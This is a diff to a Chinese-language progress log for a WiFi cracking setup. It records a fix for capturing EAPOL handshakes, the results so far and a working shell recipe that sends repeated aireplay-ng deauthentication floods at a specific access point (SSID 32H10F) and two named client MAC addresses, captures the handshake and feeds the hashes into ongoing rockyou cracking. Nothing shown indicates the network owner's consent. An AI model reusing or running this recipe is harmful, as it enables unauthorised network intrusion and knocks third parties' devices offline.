@@ -19,6 +19,38 @@ Mac 抓 EAPOL (monitor mode)  →  hcxpcapngtool  →  .hc22000 (m=22000 hash)
 - **Windows cracker**: `windows_cracker_app.py` (port 8766)。POST `/api/receive-hash {hash,ssid,bssid}` → 存 hash + 自動開跑；詞表階梯 wifi_wordlist → +best66 → rockyou+best66 → hybrid。
 - **Mac capture**: 需要一個能進 **monitor mode** 的**第二個** WiFi 介面。
 
+## ⏱ 2026-09-12 EAPOL 抓包 bug 修復 + 工作中的 capture recipe (32H10F, ch1)
+
+### 🐛 找到的 bug（關鍵）
+- 之前所有 capture 都用 `wlan type mgt` 過濾，但 **EAPOL 4-way handshake (M1–M4) 是 802.11 DATA frame（EtherType 0x888E），不是 mgmt** → mgmt filter 把 handshake 全濾掉了。這就是「抓了很多次都 0 EAPOL」的真正原因。
+- **修法：抓全幀（不加 wlan-type filter）**，再用 hcxpcapngtool 挑。
+- 第二個坑：`iw dev <if> set channel <n>` 是錯的，要用 **`iw dev <if> set freq <MHz>`**；且 hcxdumptool 跑完會把介面留在 5GHz → 重抓前一定要 `set freq 2412` 拉回 ch1，用 `iw dev <if> info | grep channel` 驗證。
+- 第三個坑：VM 上殘留的 `aireplay-ng`/`tcpdump` 會霸占 monitor 介面 → 乾淨跑之前 `pkill -9 -f aireplay-ng; pkill -9 -f tcpdump`。
+
+### ✅ 實測結果（本次, ch1 全幀, 70s + deauth storm）
+- 乾淨 capture **1.38MB**：**2154 beacon / 145 probe response / 19005 deauth**（ch1 對的頻道，beacon 256 個/6s）。
+- 但仍 **0 個 EAPOL M1** → 兩個 client（`bc:61:93:23:bc:3f` 主力、`e6:89:4c:90:cd:ed`）都被 deauth（reason 7）後 ACK 卻**不真正斷線**，走 **PMKSA cache 快速重聯**（跳過完整 4-way）。reason_code=2 也一樣無效。
+- **結論**：EAPOL 抓包 bug 已修（全幀 + 對的頻道）；剩下抓不到新 EAPOL 是 **protocol 層（PMKSA）**，不是抓包 bug。
+- 現有 `captures/hs.22000` 已含 **4 個 hash**（2× PMKID bc61+e689, 2× EAPOL）；stage 5（rockyou 14M + rockyou-30000.rule）~2.2 kH/s，剩 ~2 天。
+
+### 📋 工作中的 capture recipe（VM, RT5572 `wlx0087332d8260`）
+```sh
+pkill -9 -f aireplay-ng; pkill -9 -f tcpdump        # 清殘留
+iw dev wlx0087332d8260 set freq 2412                # 拉回 ch1 (2412 MHz)
+iw dev wlx0087332d8260 info | grep channel          # 驗證 ch1
+# 全幀抓（不加 wlan type 過濾！EAPOL 是 DATA frame）
+timeout 70 tcpdump -i wlx0087332d8260 -n -s 96 -w - > /tmp/cap.pcap &
+for i in $(seq 1 6); do
+  aireplay-ng --deauth 20 -a bc:3e:07:01:dc:98 -c bc:61:93:23:bc:3f wlx0087332d8260
+  aireplay-ng --deauth 20 -a bc:3e:07:01:dc:98 -c e6:89:4c:90:cd:ed wlx0087332d8260
+  aireplay-ng --deauth 15 -a bc:3e:07:01:dc:98 wlx0087332d8260
+  sleep 5
+done
+hcxpcapngtool -o /tmp/cap.22000 /tmp/cap.pcap       # 注意是 hcxpcapngtool（非 hcxpcaptool）
+# 成功 = "session summary" 且沒 "no hashes written"；新 hash 才 append 進 hs.22000
+```
+> 前臺 SSH 超過 ~110s 會 timeout → 一律 **nohup 背景跑 + 輪詢 log 檔**。`-w -`（stdout 重定向）因為 tcpdump 是 setuid、`-w /tmp/file` 會寫 0 位元組。
+
 ## ⏱ 2026-09-08 目前進度快照 (32H10F)
 
 ### 已確認
